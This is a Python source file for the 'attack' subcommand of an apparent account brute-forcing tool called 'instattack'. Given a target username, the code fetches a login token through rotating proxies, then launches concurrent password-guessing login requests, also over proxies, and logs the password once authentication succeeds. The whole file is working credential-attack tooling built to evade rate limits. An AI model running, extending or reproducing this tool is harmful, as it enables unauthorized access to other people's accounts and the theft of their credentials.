#!/usr/bin/env python3
import sys
import traceback

import asyncio
from plumbum import cli

from instattack import exceptions

from instattack.logger import log_handling, handle_global_exception

from instattack.users.models import User

from instattack.handlers import (
    ProxyHandler, TokenHandler, ResultsHandler, PasswordHandler)

from .base import BaseApplication, Instattack, RequestArgs
from .proxies import ProxyArgs
from .utils import cancel_remaining_tasks


class AttackArgs(RequestArgs, ProxyArgs):

    @property
    def token_handler_config(self):
        return {
            'token_max_fetch_time': self._token_max_fetch_time,
            'session_timeout': self._session_timeout['GET'],
            'connection_limit': self._connection_limit['GET'],
            'connection_force_close': self._connection_force_close,
            'connection_limit_per_host': self._connection_limit_per_host['GET'],
            'connection_keepalive_timeout': self._connection_keepalive_timeout,
        }

    @property
    def password_handler_config(self):
        return {
            'session_timeout': self._session_timeout['POST'],
            'connection_limit': self._connection_limit['POST'],
            'connection_force_close': self._connection_force_close,
            'connection_limit_per_host': self._connection_limit_per_host['POST'],
            'connection_keepalive_timeout': self._connection_keepalive_timeout,
        }


@Instattack.subcommand('attack')
class InstattackAttack(BaseApplication, AttackArgs):

    __group__ = 'Instattack Attack'

    _token_max_fetch_time = cli.SwitchAttr(
        "--token_max_fetch_time", float,
        default=10.0,
        group=__group__,
    )

    def get_handlers(self):
        proxy_handler = ProxyHandler(
            method='GET',
            **self.proxy_handler_config('GET')
        )
        token_handler = TokenHandler(
            proxy_handler,
            **self.token_handler_config
        )
        return proxy_handler, token_handler

    def post_handlers(self, user):
        proxy_handler = ProxyHandler(
            method='POST',
            **self.proxy_handler_config('POST')
        )
        password_handler = PasswordHandler(
            self.user,
            proxy_handler,
            **self.password_handler_config
        )
        return proxy_handler, password_handler

    @log_handling('self')
    def main(self, username):
        self.user = User(username)
        self.user.setup()

        loop = asyncio.get_event_loop()
        try:
            self.attack(loop)

        # This would likely be exceptions from the proxybroker package since
        # our other exceptions are handled in main().
        except Exception as e:
            exc_info = sys.exc_info()
            e = traceback.TracebackException(exc_info[0], exc_info[1], exc_info[2])
            handle_global_exception(e)

        finally:
            loop.run_until_complete(self.shutdown(loop))
            loop.close()

    def attack(self, loop):

        results = asyncio.Queue()
        results_handler = ResultsHandler(self.user, results)

        get_proxy_handler, token_handler = self.get_handlers()
        try:
            loop.run_until_complete(get_proxy_handler.prepopulate(loop))

            task_results = loop.run_until_complete(asyncio.gather(
                token_handler.consume(loop),

                # I don't think this is working with the broker...
                # We should test this without prepopulating to see if we
                # are actually getting proxies coming through...
                get_proxy_handler.produce(loop),

                # I don't think this is finding proxies, but the above producer
                # is working because of the prepopulated.
                get_proxy_handler.broker.find(),
            ))

        except Exception as e:
            exc_info = sys.exc_info()
            e = traceback.TracebackException(exc_info[0], exc_info[1], exc_info[2])
            handle_global_exception(e)

            # Might not have been stopped if we hit an exception.
            self.ensure_servers_shutdown(loop, get_proxy_handler)

        else:
            # Get Proxy Server Stopped Automatically
            token = task_results[0]
            if not token:
                raise exceptions.FatalException("Token should not be null.")
            self.log.notice('Received Token', extra={'token': token})

            post_proxy_handler, password_handler = self.post_handlers()
            try:
                loop.run_until_complete(asyncio.gather(
                    password_handler.prepopulate(loop, password_limit=self.password_limit),
                    post_proxy_handler.prepopulate(loop)
                ))

            except Exception as e:
                exc_info = sys.exc_info()
                e = traceback.TracebackException(exc_info[0], exc_info[1], exc_info[2])
                handle_global_exception(e)

            else:
                auth_result_found = asyncio.Event()

                try:
                    task_results = loop.run_until_complete(asyncio.gather(
                        results_handler.consume(loop, auth_result_found),
                        password_handler.consume(loop, auth_result_found, token, results),

                        # I don't think this is working with the broker...
                        # We should test this without prepopulating to see if we
                        # are actually getting proxies coming through...
                        post_proxy_handler.produce(loop),

                        # I don't think this is finding proxies, but the above producer
                        # is working because of the prepopulated.
                        post_proxy_handler.broker.find(),
                    ))

                except Exception as e:
                    exc_info = sys.exc_info()
                    e = traceback.TracebackException(exc_info[0], exc_info[1], exc_info[2])
                    handle_global_exception(e)

                    # Might not have been stopped if we hit an exception, but should
                    # be stopped automatically if the block succeeds.  We will
                    # leave this for now to make sure.
                    self.ensure_servers_shutdown(loop, post_proxy_handler)
                    loop.run_until_complete(results_handler.dump(loop))

                else:
                    # Post Proxy Server Stopped Automatically
                    result = task_results[0]
                    if result:
                        self.log.notice(f'Authenticated User!', extra={
                            'password': result.context.password
                        })

                finally:
                    # Might not have been stopped if we hit an exception, but should
                    # be stopped automatically if the block succeeds.  We will
                    # leave this for now to make sure.
                    self.ensure_servers_shutdown(loop, get_proxy_handler, post_proxy_handler)
                    loop.run_until_complete(results_handler.dump(loop))

    def ensure_servers_shutdown(self, loop, *handlers):
        """
        We have to run handler.server.stop() and handler.server.find()
        directly from loop.run_until_complete() instead of using the
        async methods start_server() and stop_server() - don't know why
        but that is why we cannot restrict to handler._server_running.
        """
        for handler in handlers:
            # if handler._server_running:
            self.log.warning(f'{handler.method} Proxy Server Never Stopped.')
            handler.broker.stop()

    async def shutdown(self, loop, signal=None):

        if signal:
            self.log.warning(f'Received exit signal {signal.name}...')

        with self.log.start_and_done('Shutting Down'):
            with self.log.start_and_done('Cancelling Tasks'):
                await cancel_remaining_tasks()

            loop.stop()
